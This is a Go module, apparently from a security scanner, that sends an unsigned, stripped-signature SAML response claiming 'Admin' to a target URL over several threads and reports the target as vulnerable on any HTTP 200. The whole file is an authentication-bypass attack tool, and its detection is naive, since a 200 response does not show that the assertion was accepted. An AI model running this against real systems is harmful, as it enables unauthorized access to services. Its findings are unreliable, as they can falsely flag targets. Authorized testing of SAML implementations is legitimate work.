package modules

import (
	"context"
	"net/http"
	"strings"
	"sync"
	"time"
)

// SAMLAssertionTestingResult holds the result of the SAMLAssertionTesting module execution.
type SAMLAssertionTestingResult struct {
	Target string `json:"target"`
	Status string `json:"status"`
	Detail string `json:"detail,omitempty"`
}

// SAMLAssertionTesting executes the saml_assertion_testing security technique.
type SAMLAssertionTesting struct {
	Target     string
	maxThreads int
	mu         sync.Mutex
	results    []SAMLAssertionTestingResult
	client     *http.Client
}

// NewSAMLAssertionTesting creates a new instance.
func NewSAMLAssertionTesting(target string) *SAMLAssertionTesting {
	return &SAMLAssertionTesting{
		Target:     EnsureHTTPPrefix(target),
		maxThreads: 5,
		client:     NewHTTPClient(10 * time.Second),
	}
}

func (m *SAMLAssertionTesting) SetThreads(count int) {
	if count < 1 {
		count = 1
	}
	m.maxThreads = count
}

var samlPayloads = []string{
	// Stripped signature payload
	"PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiPjxTYW1sQXV0aD5BZG1pbjwvU2FtbEF1dGg+PC9zYW1scDpSZXNwb25zZT4=",
}

func (m *SAMLAssertionTesting) Execute(ctx context.Context) ([]SAMLAssertionTestingResult, error) {
	m.results = make([]SAMLAssertionTestingResult, 0)

	jobs := make(chan string, len(samlPayloads))
	for _, p := range samlPayloads {
		jobs <- p
	}
	close(jobs)

	var wg sync.WaitGroup

	for i := 0; i < m.maxThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for payload := range jobs {
				select {
				case <-ctx.Done():
					return
				default:
					m.testPayload(ctx, payload)
				}
			}
		}()
	}

	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()

	select {
	case <-done:
		return m.results, nil
	case <-ctx.Done():
		<-done
		return m.results, ctx.Err()
	}
}

func (m *SAMLAssertionTesting) testPayload(ctx context.Context, payload string) {
	req, err := http.NewRequestWithContext(ctx, "POST", m.Target, strings.NewReader("SAMLResponse="+payload))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := m.client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		m.mu.Lock()
		m.results = append(m.results, SAMLAssertionTestingResult{
			Target: m.Target,
			Status: "vulnerable",
			Detail: "Server accepted a SAML Assertion with a stripped signature.",
		})
		m.mu.Unlock()
	}
}
